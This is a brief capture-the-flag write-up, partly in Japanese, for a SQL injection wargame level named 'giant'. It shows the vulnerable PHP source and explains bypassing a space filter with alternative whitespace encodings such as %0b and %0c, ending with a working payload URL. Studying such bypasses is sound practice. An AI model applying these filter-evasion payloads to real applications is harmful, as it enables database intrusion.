# giant

## answer

```
https://los.eagle-jump.org/giant_9e5c61fc7f0711c680a4bf2553ee60bb.php?shit=%0b
```

## problem

```
query : select 1234 fromprob_giant where 1

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(strlen($_GET[shit])>1) exit("No Hack ~_~"); 
  if(preg_match('/ |\n|\r|\t/i', $_GET[shit])) exit("HeHe"); 
  $query = "select 1234 from{$_GET[shit]}prob_giant where 1"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result[1234]) solve("giant"); 
  highlight_file(__FILE__); 
?>
```

## memo

```https://los.eagle-jump.org/giant_9e5c61fc7f0711c680a4bf2553ee60bb.php?shit=1```とかで試してみる。

```query : select 1234 from1prob_giant where 1```となった。

コードを読んでいく。

```
if(preg_match('/ |\n|\r|\t/i', $_GET[shit])) exit("HeHe"); 
```
空白文字をフィルタリングする場合に、```%09、%0a、%0b、%0c、%0d、%a0、/**/```を使用して、空白文字を置き換えることができる。

```%09、%0a```はフィルタリング、```%a0```は成功せず、```%0b、%0c```は成功

```
?shit=%0b
```

で速攻クリア。

なんかおしゃれ

## references

- [preg_match | php manual](https://www.php.net/manual/ja/function.preg-match.php)

- [mysql_fetch_array | php manual](https://www.php.net/manual/ja/function.mysql-fetch-array.php)

- [mysql_query | php manual](https://www.php.net/manual/ja/function.mysql-query.php)

- [highlight_file | php manual](https://www.php.net/manual/ja/function.highlight-file.php)